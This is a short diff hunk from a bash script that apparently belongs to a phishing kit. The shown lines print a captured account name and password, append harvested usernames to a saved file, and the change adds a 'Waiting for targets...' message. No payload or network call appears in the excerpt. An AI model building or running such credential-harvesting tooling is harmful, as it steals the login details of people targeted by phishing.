@@ -222,7 +222,7 @@ printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s
 printf "\e[1;92m[\e[0m\e[0m*\e[0m\e[1;92m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-
+printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\n"
 }
 
 
